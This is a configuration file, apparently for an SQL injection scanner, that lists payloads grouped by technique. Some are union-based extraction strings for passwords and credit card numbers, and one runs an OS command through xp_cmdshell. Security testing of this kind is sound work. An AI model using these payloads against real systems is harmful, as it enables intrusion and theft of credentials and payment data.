# config.py

# User-Agent for the HTTP requests
USER_AGENT = "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"

# Default SQL Injection payloads for testing
DEFAULT_PAYLOADS = [
    # Boolean-Based SQL Injection
    "' OR '1'='1' -- ",
    "' OR '1'='2' -- ",
    "' OR 1=1; -- ",
    "' OR 1=1 -- ",
    
    # Error-Based SQL Injection
    "' AND 1=CONVERT(int, (SELECT @@version)) -- ",
    "' AND 1=CONVERT(int, (SELECT @@databases)) -- ",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, (SELECT database()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y); -- ",

    # Union-Based SQL Injection
    "' UNION SELECT NULL, username, password FROM users -- ",
    "' UNION SELECT email, credit_card FROM customers -- ",
    "' UNION SELECT user(), database(), version(); -- ",

    # Time-Based Blind SQL Injection
    "' IF (1=1) WAITFOR DELAY '00:00:05'; -- ",
    "' IF (1=2) WAITFOR DELAY '00:00:05'; -- ",
    "' IF EXISTS (SELECT * FROM users WHERE username='admin') WAITFOR DELAY '00:00:05'; -- ",

    # Blind SQL Injection
    "' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 8; -- ",
    "' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a'; -- ",
    "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') > 0; -- ",

    # Authentication Bypass
    "' OR '1'='1' -- ",
    "' OR 'a'='a' -- ",
    "' OR '1'='1' /* ",

    # Subquery Payloads
    "' AND (SELECT COUNT(*) FROM users) > 0; -- ",
    "' AND (SELECT username FROM users LIMIT 1) = 'admin'; -- ",

    # Stored Procedures Execution
    "'; EXEC xp_cmdshell('whoami'); -- ",
    "' EXECUTE IMMEDIATE 'SELECT * FROM users'; -- ",

    # Advanced Data Extraction
    "' UNION SELECT NULL, schema_name FROM information_schema.schemata -- ",
    "' UNION SELECT username, password FROM users; -- ",

    # Variations and Encodings
    '%27%20OR%20%271%27%3D%271%27%20-- ',
    '0x27 OR 0x31=0x31 -- '
]

# Logging configuration
LOG_FILE = "sqli_scan_results.log"  # Specify the log file name
LOG_LEVEL = "INFO"  # Specify the log level (DEBUG, INFO, WARNING, ERROR, CRITICAL)
